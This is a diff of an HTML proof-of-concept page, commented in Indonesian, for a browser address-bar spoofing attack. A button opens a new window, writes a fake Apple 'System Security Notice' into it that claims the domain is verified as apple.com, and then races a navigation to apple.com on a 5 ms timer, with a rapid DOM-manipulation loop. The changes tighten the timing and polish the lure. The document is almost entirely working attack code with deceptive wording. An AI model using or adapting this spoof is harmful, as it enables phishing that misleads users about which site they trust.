@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Security Research PoC</title>
+    <title>Advanced Security Research PoC</title>
     <style>
       body, html {
         margin: 0; padding: 0; height: 100%; background: #000;
@@ -24,50 +24,59 @@
   </head>
   <body>
     <div class="card">
-      <button id="triggerBtn">VERIFY SECURE CONNECTION</button>
+      <button id="triggerBtn">INITIATE SECURE HANDSHAKE</button>
     </div>
 
     <script>
       document.getElementById("triggerBtn").onclick = function () {
         this.style.display = "none";
 
-        // Membuka tab baru / pop-up target
+        // Membuka tab baru / target window secara asinkron
         const targetWindow = window.open("about:blank", "_blank");
 
         if (targetWindow) {
-          // Menyuntikkan payload tampilan kustom (Visual Spoof)
+          // 1. Menyuntikkan tampilan spoofing visual beresolusi tinggi
           targetWindow.document.write(`
             <!DOCTYPE html>
             <html>
-            <head><title>Apple - Official Site</title></head>
+            <head><title>Apple - Official Authorization</title></head>
             <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
-              <div style="text-align:center;padding:20px;">
-                <h1 style="font-size:48px;color:#1d1d1f;margin-bottom:10px;">Apple Security Alert</h1>
-                <p style="font-size:24px;color:#86868b;">Session validation required for verification.</p>
-                <div style="margin-top:40px;font-size:18px;color:#ff3b30;font-weight:bold;">Status: Protected & Verified (apple.com)</div>
+              <div style="text-align:center;padding:30px;max-width:500px;">
+                <h1 style="font-size:36px;color:#1d1d1f;margin-bottom:15px;font-weight:600;">System Security Notice</h1>
+                <p style="font-size:18px;color:#86868b;line-height:1.5;">Your device session is currently being securely validated against trusted regional nodes.</p>
+                <div style="margin-top:30px;padding:15px;background:#e5e5ea;border-radius:10px;font-size:14px;color:#3a3a3c;font-weight:500;">
+                  Verified Domain: <span style="color:#007aff;">apple.com</span>
+                </div>
               </div>
             </body>
             </html>
           `);
           targetWindow.document.close();
 
-          // Mengeksploitasi jeda race condition navigasi ganda
+          // 2. Memanipulasi race condition navigasi ganda bertingkat (Micro-timing delay)
           setTimeout(() => {
             try {
-              targetWindow.location.href = "https://apple.com";
+              // Memicu pergantian lokasi secara instan sebelum tree layout selesai sepenuhnya
+              targetWindow.location.replace("https://apple.com");
             } catch (e) {}
-          }, 50);
+          }, 5);
 
-          // Memaksa state race condition pada render pipeline tanpa dialog modal terlarang
+          // 3. Stress-testing delegate callback pipeline tanpa melanggar kebijakan dialog modal
+          let stressLoop = 0;
           let interval = setInterval(() => {
+            stressLoop++;
             try {
-              if (targetWindow.closed) {
+              // Mencoba melakukan manipulasi status DOM ringan untuk menguji konsistensi render thread
+              if (targetWindow.document && targetWindow.document.body) {
+                targetWindow.document.body.style.zoom = (stressLoop % 2 === 0) ? "1.0" : "1.0001";
+              }
+              if (stressLoop > 100 || targetWindow.closed) {
                 clearInterval(interval);
               }
             } catch (err) {
               clearInterval(interval);
             }
-          }, 10);
+          }, 5);
         }
       };
     </script>
